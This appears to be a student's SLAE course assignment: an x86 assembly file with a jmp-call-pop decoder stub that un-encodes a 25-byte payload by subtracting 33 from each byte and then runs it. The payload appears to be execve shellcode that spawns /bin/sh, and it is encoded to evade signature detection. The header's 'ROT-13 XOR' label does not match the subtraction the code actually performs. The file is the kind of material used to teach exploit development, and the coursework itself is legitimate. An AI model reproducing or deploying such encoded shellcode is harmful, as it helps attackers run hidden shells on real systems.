# SLAE - Assignment #7: ROT-13 XOR Decoder 
# Author:  Dipsy 
# Student ID: SLAE-1535

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	mov edi, esi
	xor ecx, ecx
	mov cl, 25
	xor edx, edx	


decode:

	mov dx, [esi]
	sub dx, 33
	mov [edi], dl
	inc esi
	inc edi
	loop decode

	jmp short EncodedShellcode

call_shellcode:

	call decoder

	EncodedShellcode: db 0x52,0xe1,0x71,0x89,0x50,0x50,0x94,0x89,0x89,0x50,0x83,0x8a,0x8f,0xaa,0x04,0x71,0xaa,0x03,0x74,0xaa,0x02,0xd1,0x2c,0xee,0xa1
